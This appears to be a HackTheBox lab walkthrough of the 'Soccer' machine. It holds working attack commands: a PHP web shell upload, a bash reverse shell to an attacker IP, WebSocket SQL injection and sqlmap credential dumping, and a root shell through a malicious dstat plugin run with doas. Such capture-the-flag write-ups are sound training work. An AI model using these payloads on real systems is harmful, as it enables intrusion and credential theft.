+++
title = 'HackTheBox: Soccer Walkthrough'
date = '2025-10-02T00:00:00+00:00'
lastmod = '2025-10-02T00:00:00+00:00'
draft = false
description = 'Complete walkthrough of HackTheBox Soccer machine (10.10.11.194) covering reconnaissance, WebSocket SQL injection, and privilege escalation via doas/dstat'
summary = 'Exploit HackTheBox Soccer by chaining Tiny File Manager defaults, WebSocket SQL injection, and doas+dstat privilege escalation.'
keywords = ['hackthebox soccer', 'websocket sql injection', 'tiny file manager', 'doas privilege escalation', 'dstat exploitation', 'nginx virtual hosts']
tags = ['hackthebox', 'web-exploitation', 'websocket', 'sql-injection', 'privilege-escalation', 'doas']
categories = ['HackTheBox']
author = 'realspaceeagle'
+++

Soccer is a Linux machine that mixes classic web exploitation with modern twists such as WebSocket SQL injection and a doas-backed privilege escalation path. This post follows the exact notes I used during the engagement and includes the screenshots from my original write-up.

## Lab Preparation

```bash
# change into your working directory
cd /opt/htb/soccer

# connect to the HackTheBox VPN
sudo openvpn lab_Dream4ip.ovpn

# add the box to /etc/hosts
sudo tee -a /etc/hosts <<'EOF'
10.10.11.194 soccer.htb
EOF
```

A few helper aliases show up throughout the notes: `LPORT` references my attack box IP and `RPORT` the target. Keep them in mind when adapting the payloads.

## Reconnaissance

### Port Scanning

```bash
sudo nmap -sC -sV -oA nmap/soccer 10.10.11.194
nmap -p- -oA nmap/allports 10.10.11.194
sudo nmap -sU --min-rate 10000 -oA nmap/udp 10.10.11.194
```

The interesting hits were:

| Port | Service | Notes |
| --- | --- | --- |
| 22/tcp | OpenSSH 8.2p1 | standard Ubuntu banner |
| 80/tcp | nginx 1.18.0 | redirects to **soccer.htb** |
| 9091/tcp | HTTP API | responds with JSON errors and 404s |

## Enumerating soccer.htb

### Directory Bruteforce

```bash
gobuster dir -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php
feroxbuster -u http://soccer.htb -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
```

The enumeration turns up `/tiny`, a deployment of **Tiny File Manager 2.4.3** that still accepts the default credentials (`admin : admin@123`).

![Tiny File Manager login](/images/htb-soccer/soccer-14.png)

Inside the panel we can upload arbitrary files into `/tiny/uploads/`.

### Reverse Shell Upload

```bash
# listener
rlwrap nc -nlvp 9001

# simple PHP dropper (uploaded as shell.php)
<?php system($_GET['cmd']); ?>

# trigger the payload
curl "http://soccer.htb/tiny/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.13/9001 0>&1'"
```

From the web shell we quickly upgrade to a full TTY using the usual combo:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo; fg
export TERM=xterm
```

## Pivoting to soc-player.soccer.htb

While combing through nginx we find an additional virtual host definition.

```bash
cat /etc/nginx/sites-enabled/soc-player.htb
```

![soc-player virtual host configuration](/images/htb-soccer/soccer-13.png)

The site hosts a match stats portal that communicates over a WebSocket endpoint on port **9091**.

## Enumerating the WebSocket API

An unauthenticated request to `/check` exposes an account verification workflow. Replaying it with invalid data produces deterministic JSON responses and—critically for us—feeds directly into the back-end database query.

![Account verification request](/images/htb-soccer/soccer-12.png)

We can interact with the socket in real time:

```bash
wscat -c ws://soc-player.soccer.htb:9091/ws
{"id":"92130"}
```

![Testing the WebSocket](/images/htb-soccer/soccer-10.png)

The endpoint is vulnerable to SQL injection. Sending `{"id":"92130 or 5=1-- -"}` yields a different response, confirming Boolean-based injection.

![Boolean-based payload via WebSocket](/images/htb-soccer/soccer-09.png)

## Weaponising sqlmap over WebSockets

sqlmap can drive WebSocket traffic with the `-u ws://` syntax:

```bash
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --batch
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --level 5 --risk 3 --dbs
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' -D soccer_db -T users -C username,password --dump
```

![sqlmap identifying the backend](/images/htb-soccer/soccer-06.png)

Dumping the `users` table provides the `player` account password, `PlayerOftheMatch2022`.

```bash
sshpass -p 'PlayerOftheMatch2022' ssh player@10.10.11.194 -t bash
```

## Post-Exploitation Enumeration

With an interactive shell we sweep for privilege escalation paths:

```bash
find / -maxdepth 3 -name 'doas*' 2>/dev/null
find / -group player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'
cat /usr/local/etc/doas.conf
```

![Writable dstat plugin directory](/images/htb-soccer/soccer-07.png)

The doas policy allows `player` to run `/usr/bin/dstat` as root without a password. The plugin directory `/usr/local/share/dstat` is group-writable by `player`, which opens the door for a Python plugin backdoor.

## Privilege Escalation via dstat Plugins

Create a malicious plugin, then execute dstat through doas:

```bash
echo 'import os; os.execv("/bin/sh", ["sh"])' > /usr/local/share/dstat/dstat_xxx.py
doas /usr/bin/dstat --xxx
```

![Executing the malicious dstat plugin](/images/htb-soccer/soccer-08.png)

Alternative (user-local) approach:

```bash
mkdir -p ~/.dstat
echo 'import os; os.execv("/bin/sh", ["sh"])' > ~/.dstat/dstat_xxx.py
dstat --xxx
```

Either method drops us into a root shell:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
```

## Cheatsheet Updates

Key commands and payloads from this run were added to:

- **SQL Injection Cheatsheet** – WebSocket-based sqlmap usage and Boolean probes.
- **Linux Privilege Escalation Cheatsheet** – doas / dstat plugin workflow.

## Lessons Learned

1. **Modern protocols need love** – Treat WebSocket endpoints exactly as you would REST APIs; interception tools and automation now support them.
2. **Default credentials still bite** – Tiny File Manager ships with admin/admin@123. Changing defaults is table stakes.
3. **Least privilege on helper binaries** – Granting blanket access to `dstat` with writeable plugin paths hands over root.
4. **Automate but verify** – sqlmap handled the socket payloads, but manual validation with `wscat` saved time and confirmed behavior.

## Useful Commands Reference

```bash
# Quick recon one-liners
nmap -sV -sC -p 22,80,9091 10.10.11.194
find / -group player 2>/dev/null | grep -v '^/proc\|^/run\|^/sys'

# WebSocket probing
wscat -c ws://soc-player.soccer.htb:9091/ws
{"id":"92130 or 5=1-- -"}

# sqlmap over WebSocket
sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --batch

# doas + dstat privesc
echo 'import os; os.execv("/bin/sh", ["sh"])' > /usr/local/share/dstat/dstat_xxx.py
doas /usr/bin/dstat --xxx
```
